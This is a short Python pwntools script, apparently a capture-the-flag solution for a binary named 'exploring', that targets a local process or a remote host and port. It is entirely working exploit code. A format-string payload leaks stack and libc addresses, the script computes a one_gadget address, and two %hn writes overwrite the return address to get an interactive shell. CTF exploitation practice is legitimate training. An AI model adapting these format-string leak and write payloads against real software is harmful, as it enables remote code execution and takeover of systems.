from pwn import *
import sys

if len(sys.argv) < 2:
	p = process("./exploring")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./exploring")
else:
	p = remote("101.201.66.182","2333")
	libc = ELF("./libc.so.6")
	elf = ELF("./exploring")

code_base = 0x555555554000
def debugf():
	gdb.attach(p,"b *{b1}".format(b1 = hex(code_base + 0x96F)))

context.log_level = "debug"
context.terminal= ["tmux","splitw","-v"]
payload = "%10$p %17$p"
#debugf()
p.sendlineafter("unknown!\n",payload)
info = p.recvline()
stack_addr = int(info.split(" ")[0],16)
rip_addr = stack_addr + (0x7fffffffdb68 - 0x7fffffffdb5e)
log.success("rip_addr:"+hex(rip_addr))
libc_addr = int(info.split(" ")[1].strip(),16)
libc.address = libc_addr - 240 - libc.symbols["__libc_start_main"]
log.success("libc_base:"+hex(libc.address))
one_gadget = libc.address + 0x45216
num1 = one_gadget & 0xffff
num2 = (one_gadget>>16) & 0xffff
if num2 > num1:
	num2 = num2 - num1
else:
	num2 = num2 + (0xffff + 1) - num1
payload = "%{num1}c%12$hn%{num2}c%13$hn".format(num1=num1,num2=num2).ljust(0x30,"\x00") + p64(rip_addr) + p64(rip_addr + 2)
p.sendline(payload)
p.interactive()
